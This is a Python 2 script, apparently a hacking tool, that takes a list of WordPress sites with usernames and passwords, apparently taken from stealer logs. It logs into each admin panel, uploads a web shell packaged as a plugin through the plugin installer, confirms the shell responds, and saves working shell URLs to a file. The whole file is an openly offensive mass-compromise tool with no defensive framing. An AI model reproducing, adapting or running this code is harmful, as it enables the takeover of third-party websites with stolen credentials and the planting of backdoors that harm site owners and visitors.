import sys , requests , re , datetime , os.path
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init												
init(autoreset=True)
#Tool by Jay Hutajulu -  Improved to Upload ONly in Plugins Not in Uploads ##
fr = Fore.RED
fh = Fore.RED
fc = Fore.CYAN
fo = Fore.MAGENTA
fw = Fore.WHITE
fy = Fore.YELLOW
fbl = Fore.BLUE
fg = Fore.GREEN
sd = Style.DIM
fb = Fore.RESET
sn = Style.NORMAL
sb = Style.BRIGHT

print """{}{}
      ##    ###    ##    ##                                                 
      ##   ## ##    ##  ##                                                   
      ##  ##   ##    ####                                                    
      ## ##     ##    ##                                                     
##    ## #########    ##                                                     
##    ## ##     ##    ##                                                      
 ######  ##     ##    ##   

##     ## ##     ## ########    ###          ## ##     ## ##       ##     ## 
##     ## ##     ##    ##      ## ##         ## ##     ## ##       ##     ## 
##     ## ##     ##    ##     ##   ##        ## ##     ## ##       ##     ## 
######### ##     ##    ##    ##     ##       ## ##     ## ##       ##     ## 
##     ## ##     ##    ##    ######### ##    ## ##     ## ##       ##     ## 
##     ## ##     ##    ##    ##     ## ##    ## ##     ## ##       ##     ## 
##     ##  #######     ##    ##     ##  ######   #######  ########  #######  
                               `             '
               
              [NEW] Mass Upload Shell From Logs WP [Coded] Jay Hutajulu]
        [#] Mass WordPress XMLRPC Uploader - Mass Plugins WordPress [#]
                        


""".format(fg, sb)

if(len(sys.argv) != 2):
	path =  str(sys.argv[0]).split('\\')
	print '  [!] Enter <'+path[len(path)-1] + '> <wordpress.txt> \n      Format List  (http://domain.com/wp-login.php#username@password)'

else :
	if os.path.isfile(sys.argv[1]) :
		sites = open(sys.argv[1],'r')
		file = str(raw_input('{}{} Put Your Zipped File (UBH) : '.format(fy, sb)))
		if os.path.isfile(file) :
			if '.zip' in file :
				pluginname = str(raw_input('{}{} [+] Your Plugin Name ex: (ubh) : '.format(fo, sb)))
				shellnamezip = str(raw_input('{}{} [#] Shell Script : '.format(fy, sb)))
			findString = str(raw_input('{}{} [:=>] Name Of Your Shell (String) : '.format(fc, sb)))
			print ''
			for site in sites :
				try :
					site = site.strip()
					req = requests.session()
					pLogin = re.compile('http(.*)/wp-login.php#(.*)@(.*)')
					if re.findall(pLogin,site) :
						dataLogin = re.findall(pLogin,site)
						domain = 'http'+dataLogin[0][0]
						user = dataLogin[0][1]
						password = dataLogin[0][2]
						print "{}{} [*] Site : ".format(fc, sb)+domain+"/"
						print " [*] Username : ".format(fy, sb)+user
						print " [*] Password : ".format(fo, sb)+password
						pattern = re.compile('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*)" /><input type="hidden" name="_wp_http_referer"')
						post = {'log':user,'pwd':password,'wp-submit':'Log In','redirect_to':domain+'/wp-admin/','testcookie':'1' }
						try :
							login = req.post(domain+'/wp-login.php',data=post,timeout=30)
						except :
							print ' [-]'+'{} Time Out \n'.format(fr)
							invalid = open('failed-login.txt','a')
							invalid.write(site+"\n")
							invalid.close()							
							continue
						check = req.get(domain+'/wp-admin',timeout=60)
						if 'profile.php' in check.content :
							print ' [+]'+"{} Successful login".format(fg)
							plugin_install_php = req.get(domain+'/wp-admin/plugin-install.php?tab=upload',timeout=60)
							if re.findall(pattern,plugin_install_php.content) :
								id = re.findall(pattern,plugin_install_php.content)
								id = id[0]
								update_php = domain+'/wp-admin/update.php?action=upload-plugin'
								shellname = open(file,'rb')
								filename = file
								filedata = {'_wpnonce':id,'_wp_http_referer':'/wp-admin/plugin-install.php','install-plugin-submit':'Install Now'}
								if '.zip' in file :
									fileup = {'pluginzip':(filename,shellname,'multipart/form-data')}
								else :
									fileup = {'pluginzip':(filename,shellname)}
								Cherryreq = req.post(update_php, data=filedata, files=fileup,timeout=60)
								if '.zip' in file :
									shell = domain+'/wp-content/plugins/'+pluginname+'/'+shellnamezip
									check_plugin_shell = requests.get(shell,timeout=60)
									if findString in check_plugin_shell.content :
										print " [+] "+shell+' =>'+'{} Successful upload\n'.format(fg)
										shellsFile = open('shells.txt','a')
										shellsFile.write(shell+"\n")
										shellsFile.close()
									else :
										print " [-]"+"{} Failed upload\n".format(fr)
										upUP = open('login-succes.txt','a')
										upUP.write(site+"\n")
										upUP.close()
							else :
								print " [-]"+"{} Upload page not Working\n".format(fr)
								upUP = open('login-succes.txt','a')
								upUP.write(site+"\n")
								upUP.close()
						else :
							print ' [-]'+'{} Failed login \n'.format(fr)
							invalid = open('failed-login.txt','a')
							invalid.write(site+"\n")
							invalid.close()					
					else :
						"  Error in list !\n  Format : http://domain.com/wp-login.php#username@password"
				except :
					site = site.strip()
					print ' [-]'+'{} Time Out \n'.format(fr)
					invalid = open('invalid.txt','a')
					invalid.write(site+"\n")
					invalid.close()							
					continue
		else :
			print "       File does not exist !"
			sys.exit(0)
	else :
		print "      "+sys.argv[1]+" does not exist !"
		sys.exit(0)